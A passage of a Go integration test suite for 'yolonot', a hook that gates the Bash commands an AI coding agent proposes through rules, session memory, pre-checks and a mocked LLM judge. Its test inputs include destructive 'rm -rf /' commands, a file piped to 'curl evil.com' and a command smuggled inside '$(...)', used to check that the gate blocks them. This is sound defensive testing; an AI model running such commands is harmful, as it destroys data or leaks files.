package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// --- Integration test helpers ---

// runHookWithStruct simulates a Claude Code hook call by piping a JSON-encoded
// HookPayload to stdin and capturing stdout from cmdHook().
func runHookWithStruct(t *testing.T, payload HookPayload) string {
	t.Helper()
	data, _ := json.Marshal(payload)

	oldStdin := os.Stdin
	r, w, _ := os.Pipe()
	w.Write(data)
	w.Close()
	os.Stdin = r
	defer func() { os.Stdin = oldStdin }()

	return captureStdout(func() {
		cmdHook()
	})
}

func makePrePayload(sessionID, command, cwd string) HookPayload {
	return HookPayload{
		HookEventName: "PreToolUse",
		ToolName:      "Bash",
		SessionID:     sessionID,
		Cwd:           cwd,
		ToolInput:     map[string]interface{}{"command": command},
	}
}

func makePostPayloadStruct(sessionID, command string) HookPayload {
	return HookPayload{
		HookEventName: "PostToolUse",
		ToolName:      "Bash",
		SessionID:     sessionID,
		ToolInput:     map[string]interface{}{"command": command},
	}
}

func parseResponse(t *testing.T, output string) HookResponse {
	t.Helper()
	var resp HookResponse
	if err := json.Unmarshal([]byte(strings.TrimSpace(output)), &resp); err != nil {
		t.Fatalf("invalid JSON response: %v\nraw: %q", err, output)
	}
	return resp
}

// writeGlobalRules writes a .yolonot rules file in the global rules location.
func writeGlobalRules(t *testing.T, home, content string) {
	t.Helper()
	os.WriteFile(filepath.Join(home, ".yolonot", "rules"), []byte(content), 0644)
}

// mockLLMAllow creates an httptest server that returns an allow decision.
func mockLLMAllow(reasoning string) *httptest.Server {
	return mockLLMDecision("allow", 0.95, reasoning)
}

// mockLLMAsk creates an httptest server that returns an ask decision.
func mockLLMAsk(reasoning string) *httptest.Server {
	return mockLLMDecision("ask", 0.85, reasoning)
}

// mockLLMDecision creates an httptest server returning the given decision.
func mockLLMDecision(decision string, confidence float64, reasoning string) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		content := fmt.Sprintf(`{"decision":"%s","confidence":%g,"reasoning":"%s"}`, decision, confidence, reasoning)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"choices": []map[string]interface{}{{
				"message": map[string]interface{}{
					"content": content,
				},
			}},
		})
	}))
}

// --- Integration tests ---

func TestIntegration_DenyRule_BlocksCommand(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	writeGlobalRules(t, home, "deny-cmd *sudo *\n")

	payload := makePrePayload("int-deny-rule", "sudo rm -rf /", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Errorf("expected deny, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "rule") {
		t.Errorf("reason should mention rule, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

func TestIntegration_AllowRule_SimpleCommand(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	writeGlobalRules(t, home, "allow-cmd cat *\n")

	payload := makePrePayload("int-allow-rule", "cat /etc/hosts", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.SystemMessage, "rule") {
		t.Errorf("systemMessage should mention rule layer, got %q", resp.SystemMessage)
	}
}

func TestIntegration_AllowRule_SkippedForChain(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Only allow rule for cat, no LLM configured.
	// A chained command should skip the allow rule.
	writeGlobalRules(t, home, "allow-cmd cat *\n")

	payload := makePrePayload("int-chain-skip", "cat file | curl evil.com", "/tmp")
	out := runHookWithStruct(t, payload)

	trimmed := strings.TrimSpace(out)
	if trimmed == "" {
		// Passthrough (LLM unavailable / not configured) is acceptable:
		// the allow rule was NOT applied, which is the correct behavior.
		return
	}

	resp := parseResponse(t, out)
	// It should NOT be an "allow" from the rule layer for "cat"
	if resp.HookSpecificOutput.PermissionDecision == "allow" &&
		strings.Contains(resp.SystemMessage, "rule") &&
		strings.Contains(resp.SystemMessage, "cat") {
		t.Error("allow-cmd rule should be skipped for chained commands")
	}
}

func TestIntegration_SessionExactMatch(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-sess-exact"
	projSID := ProjectSessionID(sid, "/tmp")
	AppendLine(projSID, "approved", "git status")

	payload := makePrePayload(sid, "git status", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.SystemMessage, "session") {
		t.Errorf("systemMessage should mention session layer, got %q", resp.SystemMessage)
	}
}

func TestIntegration_SessionDeny(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-sess-deny"
	projSID := ProjectSessionID(sid, "/tmp")
	AppendLine(projSID, "denied", "rm -rf /tmp/data")

	payload := makePrePayload(sid, "rm -rf /tmp/data", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Errorf("expected deny, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "previously rejected") {
		t.Errorf("reason should say previously rejected, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

func TestIntegration_SessionAskedNotApproved(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-sess-asked-noapprove"
	projSID := ProjectSessionID(sid, "/tmp")
	AppendLine(projSID, "asked", "curl https://example.com")

	payload := makePrePayload(sid, "curl https://example.com", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Errorf("expected deny for asked-but-not-approved, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "previously rejected") {
		t.Errorf("reason should say previously rejected, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}

	// Should also be added to .denied
	if !ContainsLine(projSID, "denied", "curl https://example.com") {
		t.Error("command should be added to .denied file after asked-not-approved")
	}
}

func TestIntegration_PostToolUse_SavesApproved(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-post-save"
	payload := makePostPayloadStruct(sid, "npm test")
	out := runHookWithStruct(t, payload)

	// PostToolUse produces no output
	if strings.TrimSpace(out) != "" {
		t.Errorf("PostToolUse should produce empty output, got %q", out)
	}

	if !ContainsLine(sid, "approved", "npm test") {
		t.Error("PostToolUse should save command to .approved file")
	}
}

func TestIntegration_LLM_Allow(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	srv := mockLLMAllow("read-only command")
	defer srv.Close()

	// No matching rules
	writeGlobalRules(t, home, "# no rules\n")
	cfg := Config{Provider: ProviderConfig{URL: srv.URL, Model: "test-model", Timeout: 5}}
	SaveConfig(cfg)

	// Use a clean temp CWD so no project .yolonot rules interfere
	cleanDir := filepath.Join(home, "cleanproject")
	os.MkdirAll(cleanDir, 0755)
	origCwd, _ := os.Getwd()
	os.Chdir(cleanDir)
	defer os.Chdir(origCwd)

	payload := makePrePayload("int-llm-allow", "some-safe-operation --verbose", cleanDir)
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow from LLM, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.SystemMessage, "llm") {
		t.Errorf("systemMessage should mention llm layer, got %q", resp.SystemMessage)
	}

	// Should also save to session approved (under project-scoped session ID)
	projSID := ProjectSessionID("int-llm-allow", cleanDir)
	if !ContainsLine(projSID, "approved", "some-safe-operation --verbose") {
		t.Error("LLM allow should save to .approved session file")
	}
}

func TestIntegration_LLM_Ask(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	srv := mockLLMAsk("SENSITIVE: external network access")
	defer srv.Close()

	writeGlobalRules(t, home, "# no rules\n")
	cfg := Config{Provider: ProviderConfig{URL: srv.URL, Model: "test-model", Timeout: 5}}
	SaveConfig(cfg)

	// Use a clean temp CWD so no project .yolonot rules interfere
	cleanDir := filepath.Join(home, "cleanproject")
	os.MkdirAll(cleanDir, 0755)
	origCwd, _ := os.Getwd()
	os.Chdir(cleanDir)
	defer os.Chdir(origCwd)

	payload := makePrePayload("int-llm-ask", "risky-operation --prod", cleanDir)
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "ask" {
		t.Errorf("expected ask from LLM, got %q", resp.HookSpecificOutput.PermissionDecision)
	}

	// Should save to session asked (under project-scoped session ID)
	projSID := ProjectSessionID("int-llm-ask", cleanDir)
	if !ContainsLine(projSID, "asked", "risky-operation --prod") {
		t.Error("LLM ask should save to .asked session file")
	}
}

func TestIntegration_LLM_Unavailable(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Mock server returns 500
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("internal server error"))
	}))
	defer srv.Close()

	writeGlobalRules(t, home, "# no rules\n")
	cfg := Config{Provider: ProviderConfig{URL: srv.URL, Model: "test-model", Timeout: 5}}
	SaveConfig(cfg)

	// Use a clean temp CWD so no project .yolonot rules interfere
	cleanDir := filepath.Join(home, "cleanproject")
	os.MkdirAll(cleanDir, 0755)
	origCwd, _ := os.Getwd()
	os.Chdir(cleanDir)
	defer os.Chdir(origCwd)

	payload := makePrePayload("int-llm-unavail", "some-unknown-command --flag", cleanDir)
	out := runHookWithStruct(t, payload)

	// LLM error => no permissionDecision, systemMessage with fallback notice
	trimmed := strings.TrimSpace(out)
	if trimmed == "" {
		t.Fatal("expected JSON response with systemMessage, got empty output")
	}
	var resp HookResponse
	if err := json.Unmarshal([]byte(trimmed), &resp); err != nil {
		t.Fatalf("failed to parse hook response JSON: %v", err)
	}
	if resp.HookSpecificOutput.PermissionDecision != "" {
		t.Errorf("expected no permissionDecision on LLM failure, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.SystemMessage, "LLM unreachable") {
		t.Errorf("expected systemMessage to contain 'LLM unreachable', got %q", resp.SystemMessage)
	}
}

func TestIntegration_Paused_Bypass(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-paused"
	// Create the .paused file
	pausedFile := filepath.Join(home, ".yolonot", "sessions", sid+".paused")
	os.WriteFile(pausedFile, []byte("paused\n"), 0644)

	// Write a deny rule to prove it is truly bypassed
	writeGlobalRules(t, home, "deny-cmd *\n")

	payload := makePrePayload(sid, "rm -rf /", "/tmp")
	out := runHookWithStruct(t, payload)

	trimmed := strings.TrimSpace(out)
	if trimmed != "" {
		t.Errorf("paused session should produce empty response (total bypass), got %q", trimmed)
	}
}

func TestIntegration_Disabled_Bypass(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Write a deny rule to prove it is truly bypassed
	writeGlobalRules(t, home, "deny-cmd *\n")

	os.Setenv("YOLONOT_DISABLED", "1")
	defer os.Unsetenv("YOLONOT_DISABLED")

	payload := makePrePayload("int-disabled", "rm -rf /", "/tmp")
	out := runHookWithStruct(t, payload)

	trimmed := strings.TrimSpace(out)
	if trimmed != "" {
		t.Errorf("disabled should produce empty response (total bypass), got %q", trimmed)
	}
}

func TestIntegration_EmptyCommand(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	payload := makePrePayload("int-empty-cmd", "", "/tmp")
	out := runHookWithStruct(t, payload)

	trimmed := strings.TrimSpace(out)
	if trimmed != "" {
		t.Errorf("empty command should produce empty response, got %q", trimmed)
	}
}

func TestIntegration_DenyRuleBeatsSession(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-deny-beats-session"
	// Pre-populate session with an approved command (project-scoped)
	projSID := ProjectSessionID(sid, "/tmp")
	AppendLine(projSID, "approved", "sudo reboot")

	// Write deny rule that matches the same command
	writeGlobalRules(t, home, "deny-cmd *sudo *\n")

	payload := makePrePayload(sid, "sudo reboot", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Errorf("deny rule should beat session approval, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "rule") {
		t.Errorf("reason should mention rule, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

// writePreCheckScript creates an executable sh script that prints the given
// response to stdout. Returns the path.
func writePreCheckScript(t *testing.T, dir, name, response string) string {
	t.Helper()
	path := filepath.Join(dir, name)
	script := "#!/bin/sh\ncat <<'EOF'\n" + response + "\nEOF\n"
	if err := os.WriteFile(path, []byte(script), 0755); err != nil {
		t.Fatalf("write pre-check script: %v", err)
	}
	return path
}

func TestIntegration_PreCheck_AllowShortCircuits(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Pre-check returns allow with its own systemMessage
	script := writePreCheckScript(t, home, "pre-allow.sh",
		`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"dippy: read-only"},"systemMessage":"🐤 ls"}`)

	cfg := Config{PreCheck: PreCheckList{script}}
	SaveConfig(cfg)

	sid := "int-precheck-allow"
	payload := makePrePayload(sid, "ls -la", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow from pre-check, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	// Allow banner lives in systemMessage; reason is empty to suppress
	// Claude Code's "PreToolUse:Bash says:" prefix.
	if resp.HookSpecificOutput.PermissionDecisionReason != "" {
		t.Errorf("allow should leave reason empty, got %q", resp.HookSpecificOutput.PermissionDecisionReason)
	}
	if !strings.HasPrefix(resp.SystemMessage, "🧑\u200d🚀 pre_check (") {
		t.Errorf("systemMessage should start with pre_check layer banner, got %q", resp.SystemMessage)
	}
	if !strings.Contains(resp.SystemMessage, "pre-allow.sh") {
		t.Errorf("systemMessage should include hook short name, got %q", resp.SystemMessage)
	}
	if !strings.Contains(resp.SystemMessage, "ls -la") {
		t.Errorf("systemMessage should include the command, got %q", resp.SystemMessage)
	}

	// Should be saved to session approved
	projSID := ProjectSessionID(sid, "/tmp")
	if !ContainsLine(projSID, "approved", "ls -la") {
		t.Error("pre-check allow should save to .approved session file")
	}
}

func TestIntegration_PreCheck_AllowBannerIncludesHookName(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Pre-check allow with no systemMessage — the new banner format is
	// self-contained (🧑‍🚀 pre_check (<hook>) -> <command>), so there is
	// no per-hook body to forward.
	script := writePreCheckScript(t, home, "pre-allow-nomsg.sh",
		`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"dippy: read-only"}}`)

	SaveConfig(Config{PreCheck: PreCheckList{script}})

	payload := makePrePayload("int-precheck-nomsg", "ls", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if !strings.Contains(resp.SystemMessage, "pre_check (pre-allow-nomsg.sh)") {
		t.Errorf("systemMessage should include pre_check layer with hook name, got %q", resp.SystemMessage)
	}
	if !strings.Contains(resp.SystemMessage, "-> ls") {
		t.Errorf("systemMessage should include the command, got %q", resp.SystemMessage)
	}
}

func TestPreCheckShortName(t *testing.T) {
	tests := []struct {
		in, want string
	}{
		{"/usr/local/bin/dippy-hook", "dippy-hook"},
		{"./dippy", "dippy"},
		{"/path/to/hook.sh --flag --other", "hook.sh"},
		{"", "pre-check"},
	}
	for _, tt := range tests {
		if got := preCheckShortName(tt.in); got != tt.want {
			t.Errorf("preCheckShortName(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestIntegration_PreCheck_DenyFallsThrough(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Pre-check returns deny — yolonot should ignore and continue
	script := writePreCheckScript(t, home, "pre-deny.sh",
		`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"dippy says no"}}`)

	// yolonot has an allow rule that should take effect
	writeGlobalRules(t, home, "allow-cmd cat *\n")
	cfg := Config{PreCheck: PreCheckList{script}}
	SaveConfig(cfg)

	payload := makePrePayload("int-precheck-deny", "cat /etc/hosts", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("pre-check deny should fall through; expected yolonot allow rule, got %q",
			resp.HookSpecificOutput.PermissionDecision)
	}
}

func TestIntegration_PreCheck_EmptyFallsThrough(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Pre-check returns empty (dippy defers)
	script := writePreCheckScript(t, home, "pre-empty.sh", `{}`)

	writeGlobalRules(t, home, "allow-cmd cat *\n")
	cfg := Config{PreCheck: PreCheckList{script}}
	SaveConfig(cfg)

	payload := makePrePayload("int-precheck-empty", "cat /etc/hosts", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("pre-check empty should fall through; expected yolonot allow rule, got %q",
			resp.HookSpecificOutput.PermissionDecision)
	}
}

func TestIntegration_PreCheck_MultipleHooks_SecondAllows(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// First hook defers (empty output), second allows
	first := writePreCheckScript(t, home, "pre-first.sh", `{}`)
	second := writePreCheckScript(t, home, "pre-second.sh",
		`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"corp-gate: approved"}}`)

	cfg := Config{PreCheck: PreCheckList{first, second}}
	SaveConfig(cfg)

	payload := makePrePayload("int-precheck-multi", "ls -la", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow from second hook after first defers, got %q",
			resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.SystemMessage, "pre-second.sh") {
		t.Errorf("banner should come from the second hook, got %q", resp.SystemMessage)
	}
}

func TestIntegration_PreCheck_MultipleHooks_FirstWinsShortCircuits(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// First hook allows; second would also allow but different reason.
	// Verify the first one wins (second never runs).
	first := writePreCheckScript(t, home, "pre-first.sh",
		`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"dippy: safe"}}`)
	second := writePreCheckScript(t, home, "pre-second.sh",
		`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"other: also safe"}}`)

	cfg := Config{PreCheck: PreCheckList{first, second}}
	SaveConfig(cfg)

	payload := makePrePayload("int-precheck-first-wins", "ls -la", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if !strings.Contains(resp.SystemMessage, "pre-first.sh") {
		t.Errorf("first hook should win, got banner %q", resp.SystemMessage)
	}
}

func TestIntegration_PreCheck_LegacyStringConfigStillParses(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Write config.json by hand with the old single-string format
	script := writePreCheckScript(t, home, "pre-legacy.sh",
		`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"legacy"}}`)
	configJSON := fmt.Sprintf(`{"provider":{},"pre_check":%q}`, script)
	os.MkdirAll(filepath.Join(home, ".yolonot"), 0755)
	os.WriteFile(filepath.Join(home, ".yolonot", "config.json"), []byte(configJSON), 0600)

	cfg := LoadConfig()
	if len(cfg.PreCheck) != 1 || cfg.PreCheck[0] != script {
		t.Fatalf("legacy string config should parse into one-element list, got %v", cfg.PreCheck)
	}

	payload := makePrePayload("int-precheck-legacy", "ls -la", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow from legacy-format config, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
}

func TestIntegration_PreCheck_DenyRuleBeatsPreCheck(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	// Pre-check would allow, but deny rule runs first (step 0 before step 0.5)
	script := writePreCheckScript(t, home, "pre-allow-dangerous.sh",
		`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"fine by me"}}`)

	writeGlobalRules(t, home, "deny-cmd *sudo *\n")
	cfg := Config{PreCheck: PreCheckList{script}}
	SaveConfig(cfg)

	payload := makePrePayload("int-precheck-deny-first", "sudo reboot", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Errorf("deny rule should beat pre-check allow, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
}

func TestIntegration_AskRule_SavesAsked(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	sid := "int-ask-rule"
	writeGlobalRules(t, home, "ask-cmd *curl *\n")

	payload := makePrePayload(sid, "curl https://example.com/api", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "ask" {
		t.Errorf("expected ask, got %q", resp.HookSpecificOutput.PermissionDecision)
	}

	// Verify the command was saved to .asked (under project-scoped session ID)
	projSID := ProjectSessionID(sid, "/tmp")
	if !ContainsLine(projSID, "asked", "curl https://example.com/api") {
		t.Error("ask rule should save command to .asked session file")
	}
}

// --- fast-allow integration tests ---

func TestIntegration_FastAllow_AllowsSafeCommand(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})

	sid := "int-fast-allow-ls"
	payload := makePrePayload(sid, "ls -la /tmp", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Errorf("expected allow, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.SystemMessage, "fast_allow") {
		t.Errorf("systemMessage should mention fast_allow layer, got %q", resp.SystemMessage)
	}

	// Session memory should be updated.
	projSID := ProjectSessionID(sid, "/tmp")
	if !ContainsLine(projSID, "approved", "ls -la /tmp") {
		t.Error("fast-allow should record command in .approved session file")
	}
}

func TestIntegration_FastAllow_FallsThroughOnUnsafe(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})

	// CmdSubst with an unsafe inner command must not short-circuit as
	// fast_allow. (CmdSubst with a safe inner — e.g. `ls $(pwd)` — is
	// allowed per Dippy parity; here we pick an inner that can't pass.)
	payload := makePrePayload("int-fast-allow-subst", "ls $(rm -rf /tmp/foo)", "/tmp")
	out := runHookWithStruct(t, payload)

	trimmed := strings.TrimSpace(out)
	if trimmed == "" {
		// Passthrough when no LLM configured is fine — it means we did NOT
		// short-circuit as fast_allow, which is what we're checking.
		return
	}
	resp := parseResponse(t, out)
	// Whatever the final layer, it must not be the fast_allow fast path.
	if strings.Contains(resp.SystemMessage, "fast_allow") {
		t.Errorf("command with $(...) should NOT hit fast_allow, got systemMessage %q",
			resp.SystemMessage)
	}
}

func TestIntegration_FastAllow_OffMeansNoShortCircuit(t *testing.T) {
	_, cleanup := withFakeHome(t)
	defer cleanup()

	// No fast-allow in pre-check list.
	SaveConfig(Config{})

	payload := makePrePayload("int-fast-allow-off", "ls", "/tmp")
	out := runHookWithStruct(t, payload)

	trimmed := strings.TrimSpace(out)
	if trimmed == "" {
		// Passthrough — fine, means we did not short-circuit.
		return
	}
	resp := parseResponse(t, out)
	if strings.Contains(resp.SystemMessage, "fast_allow") {
		t.Errorf("fast-allow was off but still fired: %q", resp.SystemMessage)
	}
}

func TestIntegration_FastAllow_DenyRuleStillWins(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})
	// A deny-cmd rule that matches `ls` — Step 0 (deny rules) must beat
	// Step 0.5 (pre-check including fast-allow).
	writeGlobalRules(t, home, "deny-cmd ls*\n")

	payload := makePrePayload("int-fast-allow-deny", "ls -la", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "deny" {
		t.Errorf("expected deny from rule, got %q with reason %q",
			resp.HookSpecificOutput.PermissionDecision,
			resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

// fast_allow must defer to user `ask-cmd` rules, not only hard deny rules.
// curl looks read-only to IsLocallySafe (GET semantics) so without this
// deference an `ask-cmd *curl *` gets silently auto-approved.
func TestIntegration_FastAllow_AskRuleStillWins(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})
	writeGlobalRules(t, home, "ask-cmd *curl *\n")

	payload := makePrePayload("int-fast-allow-ask", "curl https://example.com", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "ask" {
		t.Errorf("expected ask from rule, got %q (systemMessage=%q, reason=%q)",
			resp.HookSpecificOutput.PermissionDecision,
			resp.SystemMessage,
			resp.HookSpecificOutput.PermissionDecisionReason)
	}
	// Attribution: banner must credit the rule layer, not fast_allow.
	if strings.Contains(resp.SystemMessage, "fast_allow") ||
		strings.Contains(resp.HookSpecificOutput.PermissionDecisionReason, "fast_allow") {
		t.Errorf("banner should credit rule layer, not fast_allow; got systemMessage=%q reason=%q",
			resp.SystemMessage, resp.HookSpecificOutput.PermissionDecisionReason)
	}
}

// When a user allow-cmd matches, fast_allow should still defer so the rule
// layer (not fast_allow) gets attribution — the decision is the same either
// way, but the banner should reflect the user's intent.
func TestIntegration_FastAllow_AllowRuleGetsAttribution(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})
	writeGlobalRules(t, home, "allow-cmd ls*\n")

	payload := makePrePayload("int-fast-allow-allow-rule", "ls -la", "/tmp")
	out := runHookWithStruct(t, payload)

	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "allow" {
		t.Fatalf("expected allow, got %q", resp.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(resp.SystemMessage, "rule") {
		t.Errorf("banner should credit rule layer, got %q", resp.SystemMessage)
	}
	if strings.Contains(resp.SystemMessage, "fast_allow") {
		t.Errorf("banner should not credit fast_allow when a rule matches, got %q", resp.SystemMessage)
	}
}

// A session exact-match (prior approval) must bypass a newly-added ask-cmd,
// otherwise users get re-prompted every turn for commands they already said
// yes to. This reproduces the user's bug: `ask-cmd *curl *` + approve once +
// run again → expected allow via session, not ask again.
func TestIntegration_AskRule_SessionExactMatchBypasses(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()
	_ = home

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})
	writeGlobalRules(t, home, "ask-cmd *curl *\n")

	sid := "int-ask-session-bypass"
	cmd := "curl example.com"

	// First run: ask rule fires.
	out := runHookWithStruct(t, makePrePayload(sid, cmd, "/tmp"))
	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "ask" {
		t.Fatalf("first call: expected ask, got %q", resp.HookSpecificOutput.PermissionDecision)
	}

	// Simulate the user approving and the tool running: Claude Code fires a
	// PostToolUse, which yolonot uses to record the approval. Cwd must match
	// the Pre payload so the project-scoped session ID resolves to the same file.
	post := makePostPayloadStruct(sid, cmd)
	post.Cwd = "/tmp"
	runHookWithStruct(t, post)

	// Second run: session exact-match must bypass the ask rule.
	out2 := runHookWithStruct(t, makePrePayload(sid, cmd, "/tmp"))
	resp2 := parseResponse(t, out2)
	if resp2.HookSpecificOutput.PermissionDecision != "allow" {
		t.Fatalf("second call: expected allow via session, got %q (reason=%q)",
			resp2.HookSpecificOutput.PermissionDecision,
			resp2.HookSpecificOutput.PermissionDecisionReason)
	}
	if !strings.Contains(resp2.SystemMessage, "session") {
		t.Errorf("second call: banner should credit session layer, got %q", resp2.SystemMessage)
	}
}

// Mirror of the ask-rule bypass test: a prior session rejection must bypass a
// later ask-cmd rule. Without this, the ask rule re-prompts forever even
// after the user has already said no to the exact command.
func TestIntegration_AskRule_SessionDenyBypasses(t *testing.T) {
	home, cleanup := withFakeHome(t)
	defer cleanup()

	SaveConfig(Config{PreCheck: PreCheckList{FastAllowSentinel}})
	writeGlobalRules(t, home, "ask-cmd *curl *\n")

	sid := "int-ask-session-deny-bypass"
	cmd := "curl example.com"

	// First run: ask rule fires, command goes onto the `asked` list.
	out := runHookWithStruct(t, makePrePayload(sid, cmd, "/tmp"))
	resp := parseResponse(t, out)
	if resp.HookSpecificOutput.PermissionDecision != "ask" {
		t.Fatalf("first call: expected ask, got %q", resp.HookSpecificOutput.PermissionDecision)
